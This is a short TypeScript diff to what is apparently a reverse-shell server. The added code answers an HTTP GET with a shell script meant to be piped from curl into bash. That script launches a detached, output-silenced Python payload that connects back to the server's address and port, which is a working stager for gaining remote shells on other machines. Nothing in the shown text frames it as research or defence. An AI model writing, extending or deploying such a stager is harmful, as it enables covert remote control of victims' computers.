@@ -216,6 +216,16 @@ reverseShellServer.on('connection', (socket) => {
 
     const onHeader = (chunk: Buffer) => {
         headerBuf = Buffer.concat([headerBuf, chunk]);
+        // HTTP GET → serve the bootstrap script (curl ... | bash)
+        if (/^GET /.test(headerBuf.toString('binary'))) {
+            clearTimeout(legacyTimer);
+            socket.off('data', onHeader);
+            // Answer with the address the client actually reached us on
+            const ip = normalizeIp(socket.localAddress ?? serverIp);
+            const body = `nohup python3 -c '${escapedScript}' ${ip} ${PORT} </dev/null >/dev/null 2>&1 &\n`;
+            socket.end(`HTTP/1.1 200 OK\r\nContent-Type: text/x-shellscript\r\nConnection: close\r\nContent-Length: ${Buffer.byteLength(body)}\r\n\r\n${body}`);
+            return;
+        }
         const nl = headerBuf.indexOf('OLLEH');
         if (nl === -1) return;
 
